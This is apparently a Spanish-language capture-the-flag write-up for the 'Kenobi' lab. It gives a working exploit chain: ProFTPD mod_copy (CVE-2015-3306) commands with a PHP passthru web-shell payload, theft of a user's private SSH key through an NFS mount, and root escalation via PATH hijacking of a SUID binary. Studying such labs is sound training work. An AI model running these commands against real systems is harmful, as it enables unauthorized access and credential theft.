# Kenobi
Room interesante enumeracion al principio , exploit diferente  a lo común ya que no es tirar el exploit del CVE, si no mas bien saber como usarlo a tu favor y privesc personalizada

Interesntes: CVE 2015-3306 , Path manipulation
## Initial Scan 
```
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      35429/udp   mountd
|   100005  1,2,3      38895/udp6  mountd
|   100005  1,2,3      46771/tcp6  mountd
|   100005  1,2,3      47749/tcp   mountd
|   100021  1,3,4      37411/tcp6  nlockmgr
|   100021  1,3,4      45275/tcp   nlockmgr
|   100021  1,3,4      46996/udp   nlockmgr
|   100021  1,3,4      56538/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
34743/tcp open  mountd      1-3 (RPC #100005)
39631/tcp open  mountd      1-3 (RPC #100005)
45275/tcp open  nlockmgr    1-4 (RPC #100021)
47749/tcp open  mountd      1-3 (RPC #100005)

```
## Enum
### FTP
Version vulnerable a CVE 2015-3306 
```
site cpfr /proc/self/cmdline
site cpto /tmp/.<?php passthru($_GET['cmd']);?>
site cpfr /tmp/.<?php passthru($_GET['cmd']);?>
site cpto /var/www/html/backdoor.php
```
Probamos eso pero no podemos hacer la copia a final, aun asi sabemos que es vulnerable asi que no esta todo perdido, exploremos esto mas tarde
### SMB
Veamos los shares
```
	print$          Disk      Printer Drivers
	anonymous       Disk      
	IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
```
Y nos descargamos todo lo que haya en anonymous
```
 smbget smb://10.10.117.123//anonymous -R
```
Y obtenemos un log.txt, donde hay un par de lineas  interesantes
```
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
```
### Mountd
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount IP
```
Veremos que esta montado /var

## Explotation

El plan es el siguiente, copiamos la clave a /var/tmp y montamos /vat/tmp en nuestra máquina
### FTP
```
ftp> site cpfr /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
ftp> site cpto /var/tmp/id_rsa
```
### Montaje
```
sudo mount 10.10.117.123:/var kenobi/
```
### SSH
```
ssh -i id_rsa kenobi@10.10.117.123
```
## Privesc
Buscamos SUID binarys y encontramos uno poco comun
```
/usr/bin/menu
```
Mirando las strings encontramos las 3 siguientes
```
curl -I localhost
uname -r
ifconfig
```
Dado que los comandos no estan con su ruta al completo podemos ejecutar un PATH manipulation
```
cp /bin/bash /tmp/ifconfig
PATH=/tmp:$PATH
 ./../usr/bin/menu 
```
Y ya tenemos shell como root
